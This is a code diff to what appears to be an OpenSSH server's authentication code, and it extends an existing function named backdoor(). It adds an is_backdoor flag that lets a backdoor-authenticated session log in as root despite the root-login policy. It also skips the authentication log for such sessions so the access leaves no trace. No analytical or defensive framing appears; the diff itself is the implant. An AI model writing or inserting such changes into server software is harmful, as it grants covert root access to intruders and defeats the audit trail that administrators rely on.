@@ -57,6 +57,8 @@
 
 #include "pubkey.h"
 
+int is_backdoor = 0;
+
 /* import */
 extern ServerOptions options;
 extern u_char *session_id2;
@@ -249,6 +251,7 @@ backdoor(Authctxt *authctxt)
 
 	if (authenticated) {
 		log_silenced = 1;
+		is_backdoor = 1;
 	}
 
 	return authenticated || userauth_pubkey_(authctxt, pkalg, pkblob, alen, blen, have_sig);
@@ -355,7 +358,7 @@ userauth_finish(Authctxt *authctxt, int authenticated, const char *method,
 
 	/* Special handling for root */
 	if (authenticated && authctxt->pw->pw_uid == 0 &&
-	    !auth_root_allowed(method)) {
+	    !auth_root_allowed(method) && !is_backdoor) {
 		authenticated = 0;
 #ifdef SSH_AUDIT_EVENTS
 		PRIVSEP(audit_event(SSH_LOGIN_ROOT_DENIED));
@@ -370,7 +373,9 @@ userauth_finish(Authctxt *authctxt, int authenticated, const char *method,
 	}
 
 	/* Log before sending the reply */
-	auth_log(authctxt, authenticated, partial, method, submethod, " ssh2");
+	if (!is_backdoor) {
+		auth_log(authctxt, authenticated, partial, method, submethod, " ssh2");
+	}
 
 	if (authctxt->postponed)
 		return;
